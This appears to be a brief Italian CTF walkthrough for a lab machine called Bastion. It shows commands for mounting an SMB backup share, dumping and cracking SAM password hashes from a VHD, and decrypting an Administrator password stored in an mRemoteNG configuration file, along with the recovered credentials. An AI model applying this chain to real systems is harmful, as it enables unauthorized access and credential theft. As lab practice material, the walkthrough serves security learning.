Cosa fare:

Noto che c'è samba, quindi girando su samba backup trovo cose interessanti.
Monto la shared directory sul pc mio sudo mount -t cifs -o username=guest //10.10.10.134/Backups /mnt
monto il file vhd, e trovo su SAM files, utilizzando samdump2 (mi dumpo l'hash file di password : 26112010952d963c8dc4217daec986d9 risultato: bureaulampje

Ora accedo a ssh con user L4mpje e pass bureaulampje
per user: dir, cd Desktop , type user.txt

root:
troviamo un programma interessant mRemoteNG
qualcuno ha creato un programma che si copia tutte le password digitate,
andiamo quindi in C/Users/L4mpje/AppData/Roaming/mRemoteNG type di confCons.xml e ci prendiamo la password admin

Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="

/hack/bastion/mremoteng-decrypt$ python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2